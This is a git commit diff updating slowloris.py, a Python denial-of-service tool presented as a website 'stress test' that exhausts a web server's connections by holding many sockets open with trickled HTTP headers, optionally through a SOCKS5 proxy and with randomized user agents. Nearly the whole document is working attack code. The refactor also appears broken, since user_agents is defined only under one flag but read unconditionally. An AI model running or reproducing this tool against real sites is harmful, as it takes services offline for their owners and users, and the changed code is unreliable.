09d605e18fbaf4ceb9121a653b1a551a882df1ac
Spyboy <spyboy.spice@gmail.com>
2023-11-18 02:53:43 +0530

    Update slowloris.py

--- slowloris.py
+++ slowloris.py
@@ -3,88 +3,47 @@ import argparse
 import logging
 import random
 import socket
+import ssl  # Added import for ssl module
 import sys
 import time
+
+# Constants
+DEFAULT_SLEEP_TIME = 15
+DEFAULT_PORT = 80
+SOCK_TIMEOUT = 4
+
+# User Agents file path
+USER_AGENTS_FILE = "user_agents.txt"
 
 parser = argparse.ArgumentParser(
     description="Slowloris, low bandwidth stress test tool for websites"
 )
 parser.add_argument("host", nargs="?", help="Host to perform stress test on")
-parser.add_argument(
-    "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
-)
-parser.add_argument(
-    "-s",
-    "--sockets",
-    default=150,
-    help="Number of sockets to use in the test",
-    type=int,
-)
-parser.add_argument(
-    "-v",
-    "--verbose",
-    dest="verbose",
-    action="store_true",
-    help="Increases logging",
-)
-parser.add_argument(
-    "-ua",
-    "--randuseragents",
-    dest="randuseragent",
-    action="store_true",
-    help="Randomizes user-agents with each request",
-)
-parser.add_argument(
-    "-x",
-    "--useproxy",
-    dest="useproxy",
-    action="store_true",
-    help="Use a SOCKS5 proxy for connecting",
-)
-parser.add_argument(
-    "--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host"
-)
-parser.add_argument(
-    "--proxy-port", default="8080", help="SOCKS5 proxy port", type=int
-)
-parser.add_argument(
-    "--https",
-    dest="https",
-    action="store_true",
-    help="Use HTTPS for the requests",
-)
-parser.add_argument(
-    "--sleeptime",
-    dest="sleeptime",
-    default=15,
-    type=int,
-    help="Time to sleep between each header sent.",
-)
+parser.add_argument("-p", "--port", default=DEFAULT_PORT, help="Port of webserver, usually 80", type=int)
+parser.add_argument("-s", "--sockets", default=150, help="Number of sockets to use in the test", type=int)
+parser.add_argument("-v", "--verbose", dest="verbose", action="store_true", help="Increases logging")
+parser.add_argument("-ua", "--randuseragents", dest="randuseragent", action="store_true", help="Randomizes user-agents with each request")
+parser.add_argument("-x", "--useproxy", dest="useproxy", action="store_true", help="Use a SOCKS5 proxy for connecting")
+parser.add_argument("--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host")
+parser.add_argument("--proxy-port", default=8080, help="SOCKS5 proxy port", type=int)
+parser.add_argument("--https", dest="https", action="store_true", help="Use HTTPS for the requests")
+parser.add_argument("--sleeptime", dest="sleeptime", default=DEFAULT_SLEEP_TIME, type=int, help="Time to sleep between each header sent.")
 parser.set_defaults(verbose=False)
 parser.set_defaults(randuseragent=False)
 parser.set_defaults(useproxy=False)
 parser.set_defaults(https=False)
 args = parser.parse_args()
 
-if len(sys.argv) <= 1:
+if len(sys.argv) <= 1 or not args.host:
     parser.print_help()
     sys.exit(1)
 
-if not args.host:
-    print("Host required!")
-    parser.print_help()
-    sys.exit(1)
-
+# Proxy Handling:
 if args.useproxy:
-    # Tries to import to external "socks" library
-    # and monkey patches socket.socket to connect over
-    # the proxy by default
     try:
         import socks
 
-        socks.setdefaultproxy(
-            socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port
-        )
+        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
         socket.socket = socks.socksocket
         logging.info("Using SOCKS5 proxy for connecting...")
     except ImportError:
@@ -97,59 +56,31 @@ logging.basicConfig(
     level=logging.DEBUG if args.verbose else logging.INFO,
 )
 
-
 def send_line(self, line):
     line = f"{line}\r\n"
     self.send(line.encode("utf-8"))
 
-
 def send_header(self, name, value):
     self.send_line(f"{name}: {value}")
 
-
 if args.https:
     logging.info("Importing ssl module")
-    import ssl
-
     setattr(ssl.SSLSocket, "send_line", send_line)
     setattr(ssl.SSLSocket, "send_header", send_header)
 
 list_of_sockets = []
-user_agents = [
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
-    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
-]
+
+# User-Agent Randomization:
+if args.randuseragent:
+    with open(USER_AGENTS_FILE, "r") as file:
+        user_agents = [line.strip() for line in file.readlines()]
 
 setattr(socket.socket, "send_line", send_line)
 setattr(socket.socket, "send_header", send_header)
 
-
 def init_socket(ip: str):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(4)
+    s.settimeout(SOCK_TIMEOUT)
 
     if args.https:
         ctx = ssl.create_default_context()
@@ -158,7 +89,6 @@ def init_socket(ip: str):
         s = ctx.wrap_socket(s, server_hostname=args.host)
 
     s.connect((ip, args.port))
-
     s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
 
     ua = user_agents[0]
@@ -169,20 +99,15 @@ def init_socket(ip: str):
     s.send_header("Accept-language", "en-US,en,q=0.5")
     return s
 
-
 def slowloris_iteration():
     logging.info("Sending keep-alive headers...")
     logging.info("Socket count: %s", len(list_of_sockets))
 
-    # Try to send a header line to each socket
     for s in list(list_of_sockets):
         try:
             s.send_header("X-a", random.randint(1, 5000))
         except socket.error:
             list_of_sockets.remove(s)
-
-    # Some of the sockets may have been closed due to errors or timeouts.
-    # Re-create new sockets to replace them until we reach the desired number.
 
     diff = args.sockets - len(list_of_sockets)
     if diff <= 0:
@@ -198,7 +123,6 @@ def slowloris_iteration():
         except socket.error as e:
             logging.debug("Failed to create new socket: %s", e)
             break
-
 
 def main():
     ip = args.host
@@ -222,10 +146,9 @@ def main():
             logging.info("Stopping Slowloris")
             break
         except Exception as e:
-            logging.debug("Error in Slowloris iteration: %s", e)
+            logging.error("Error in Slowloris iteration: %s", e)
         logging.debug("Sleeping for %d seconds", args.sleeptime)
         time.sleep(args.sleeptime)
-
 
 if __name__ == "__main__":
     main()
